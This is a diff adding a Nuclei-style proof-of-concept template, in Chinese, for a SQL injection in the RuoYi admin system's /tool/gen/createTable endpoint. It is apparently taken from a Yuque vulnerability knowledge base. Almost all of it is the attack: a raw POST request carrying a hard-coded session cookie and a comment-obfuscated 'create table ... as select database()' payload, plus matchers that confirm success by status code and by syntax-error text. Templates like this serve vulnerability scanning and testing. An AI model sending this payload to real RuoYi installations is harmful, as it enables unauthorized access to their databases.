@@ -1,0 +1,51 @@
+id: poc-ublrigissnd1391p
+info:
+  name: 若依RuoYi系统 sql注入4
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ublrigissnd1391p'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ublrigissnd1391p
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /tool/gen/createTable HTTP/1.1
+
+
+    accept: */*
+
+
+    Cookie: JSESSIONID=62627303-0fd9-45d8-be63-2fbcb8de6594
+
+
+    Connection: close
+
+
+    Content-type: application/x-www-form-urlencoded
+
+
+
+
+    sql=create/**/table/**/test/**/as/**/select/**/database()
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?syntax)(?=.*?error).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
